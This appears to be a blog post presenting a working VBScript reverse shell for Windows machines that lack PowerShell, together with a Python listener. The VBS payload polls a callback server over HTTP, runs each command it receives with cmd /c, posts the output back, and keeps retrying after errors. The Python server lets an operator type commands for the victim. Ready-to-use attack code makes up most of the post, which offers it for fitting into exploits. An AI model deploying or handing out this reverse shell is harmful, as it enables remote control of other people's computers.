=================
VBS Reverse Shell
=================

Introduction
============

**tl;dr:** https://github.com/cym13/vbs-reverse-shell

Reverse shells are scripts that provide shell access to remote users. They
are omnipresent when it comes to computer hacking as they allow the attacker
to transform a single often tedious command execution into an interactive
shell fit for further exploitation.

Most reverse shells scripts are in Bash, Perl or Python for Linux, or
Powershell for Windows. One may notice the lack of options when it comes to
hacking Windows computers: the fact is that if Powershell is available then
it should be used as it's a very powerful scripting language. But not all
Windows have Powershell, and in its absence one may wonder what to do.

We will explore another alternative for Windows systems: Visual Basic Script.

The language
============

VBS is a scripting language inspired by Microsoft's Visual Basic and created
in 1996. It has been the default Windows scripting language since Windows 98
and Windows Server NT 4.0 and is still available on Windows 10 today.

Long story short it's an awful language but it's powerful and resilient. It's
been used to attack computers for a long time and notably used for the famous
virus ILOVEYOU_.

.. _ILOVEYOU: https://en.wikipedia.org/wiki/ILOVEYOU

.. image:: ../image/mary_love_letter.png
    :width: 40%

*So if it's such a ubiquitous language, why isn't it already used for reverse
shells by most people?*

Well, the main reason is that VBS has no easy way to deal with raw sockets by
default. Reverse shells are usually about reading commands from a socket,
executing them, printing their output to the socket and looping over. No raw
socket API means that this simple strategy isn't so simple anymore.

What VBS has however is a way to perform web requests, so the strategy we'll
use is to encapsulate commands and outputs in HTTP requests. This will need a
specific server but it isn't much of an issue.

Of course we could just download a compiled reverse shell through our VBS
script and launch it, but I want to explore a pure VBS option for when
two-stage exploitations are not an option.

The payload
===========

The VBS payload will ask the callback server for commands through GET
requests, reading it from the response. It will then execute the command and
POST the output to the server. No response is expected at that point.

The good thing with that strategy is that it works. I mean, as we said
earlier, VBS has its limitations so getting a working reverse shell is worth
mentioning.

There are also some disadvantages:

- It is stateless, in particular this implementation doesn't allow the user
  to change directory or define variables. Each request is independent from
  the others.

- It's big. A `typical bash reverse shell`__ doesn't take more than 40 chars
  which can easily be concealed or transmitted through narrow buffers. Our
  script is 20 times bigger than that.

- It cannot be transformed into a full TTY shell easily. This means that
  commands that would interactively ask for user input will fail.

.. _bashrs: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

__ bashrs_

An interesting implementation detail though: by using *On Error Resume Next*
we tell the script not to stop on errors. This way, even if we're stalled or
if the connection with the server is lost the script will just retry again
and give us the hand back. We're never stuck (although we may have to wait a
few minutes).

For this reason we defined an exit flag: *EXIT*. This allows us to shut the
script down properly.

Without further delay, here is the full payload I use:

.. code:: vbnet

    Option Explicit
    On Error Resume Next

    CONST callbackUrl = "http://localhost:80/"

    Dim xmlHttpReq, shell, execObj, command, break, result

    Set shell = CreateObject("WScript.Shell")

    break = False
    While break <> True
        Set xmlHttpReq = WScript.CreateObject("MSXML2.ServerXMLHTTP")
        xmlHttpReq.Open "GET", callbackUrl, false
        xmlHttpReq.Send

        command = "cmd /c " & Trim(xmlHttpReq.responseText)

        If InStr(command, "EXIT") Then
            break = True
        Else
            Set execObj = shell.Exec(command)

            result = ""
            Do Until execObj.StdOut.AtEndOfStream
                result = result & execObj.StdOut.ReadAll()
            Loop

            Set xmlHttpReq = WScript.CreateObject("MSXML2.ServerXMLHTTP")
            xmlHttpReq.Open "POST", callbackUrl, false
            xmlHttpReq.Send(result)
        End If
    Wend

The server
==========

A special client means a special server. I choose to do it in Python for
its portability. I decided to use raw sockets and build an HTTP facade on top
of it. This is because I fear that what we exchange through this tunnel
will not always be proper HTTP requests and I don't want a real HTTP server
to helpfully throw exceptions every time it encounters badly formed requests.

The thing is, we don't need to handle real HTTP requests, just to distinguish
GET requests from POST ones. And that's exactly what we do:

.. code:: python

    #!/usr/bin/env python3

    import socketserver

    PORT=80

    class CmdHttpHandler(socketserver.BaseRequestHandler):
        def handle(self):
            self.data = self.request.recv(2**14).strip().decode("UTF-8")

            if len(data) == 0:
                return

            elif self.data.splitlines()[0].startswith("GET"):
                command = input("%s > " % self.client_address[0]).encode("UTF-8")

                response = (b"HTTP/1.1 200\ncontent-length: "
                            + str(len(command)).encode("UTF-8")
                            + b"\n\n"
                            + command)

                self.request.sendall(response)


            elif self.data.splitlines()[0].startswith("POST"):
                data = self.request.recv(2**14).strip().decode("UTF-8")
                print(data)
                print()

                response = (b"HTTP/1.1 200\ncontent-length: 0\n\n")
                self.request.sendall(response)
                return


            else:
                print(self.data.decode("UTF-8"))
                response = (b"HTTP/1.1 300\ncontent-length: 0\n\n")
                self.request.sendall(response)


    def main():
        print("To close connection enter 'EXIT'")
        print("The computer may be stalled by some commands, just try again")
        print()

        with socketserver.TCPServer(("0.0.0.0", PORT), CmdHttpHandler) as server:
            server.serve_forever()


    if __name__ == "__main__":
        main()

Conclusion
==========

When I first encountered a case where I needed a non-Powershell Windows
reverse shell I was frustrated not to find any. Hopefully nobody will be in
this situation anymore.

The VBS code may be minimized to better fit in a tight exploit, but I don't
think it will account for much. I'm guessing something like 700 bytes is the
limit. I would be very glad if you were to prove me wrong though!

.. image:: ../image/aihara_enju.png
    :width: 60%

Image sources
-------------

- https://fluffyqueenz.deviantart.com/art/OC-Will-you-accept-my-love-letter-senpai-678491065
- https://www.quora.com/Whats-the-best-loli-anime
